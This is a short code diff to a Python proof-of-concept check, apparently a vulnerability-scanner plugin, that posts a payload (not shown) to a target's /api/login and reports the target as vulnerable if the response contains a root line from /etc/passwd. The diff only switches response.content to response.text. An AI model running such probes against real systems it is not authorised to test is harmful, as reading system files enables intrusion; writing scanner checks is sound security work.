@@ -63,7 +63,7 @@ class Poc(ABPoc):
             expurl = arg + '/api/login'
             try:
                 response = requests.post(expurl, data=payload, timeout=50)
-                if re.match('root:.+?:0:0:.+?:.+?:.+?', response.content) and response.status_code == 200:
+                if re.match('root:.+?:0:0:.+?:.+?:.+?', response.text) and response.status_code == 200:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
             except Exception as e:
